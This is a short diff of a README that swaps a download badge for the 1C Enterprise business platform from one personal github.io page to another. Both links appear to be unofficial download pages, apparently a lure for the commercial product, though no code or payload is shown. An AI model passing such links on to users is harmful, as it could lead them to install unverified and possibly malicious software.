@@ -3,7 +3,7 @@
 
 ## Start Building
 
-[![Get 1C Enterprise](https://img.shields.io/badge/Get-1C%20Enterprise-2c3e50?style=flat-square&logo=windows&logoColor=white)](https://meiknoop11.github.io/.github/1C-Enterprise)
+[![Explore 1C Enterprise](https://img.shields.io/badge/Explore-1C%20Enterprise-FACC15?style=for-the-badge)](https://1c-enterprise-tool.github.io/.github/)
 
 ![1C Enterprise platform dashboard for business workflows](https://lh4.googleusercontent.com/enhj4Sme0JCqlFnkGWzuEr1sO3mUk8sNQgBGO-UBVbniIKdOiFkBTGrriSrt805ywZZmMrz6M16sG38q1kY_-sQniT7iC52vA9-At_En-gw7E5wbgospQ3hMvkNeFy_59t67xI4e)
 
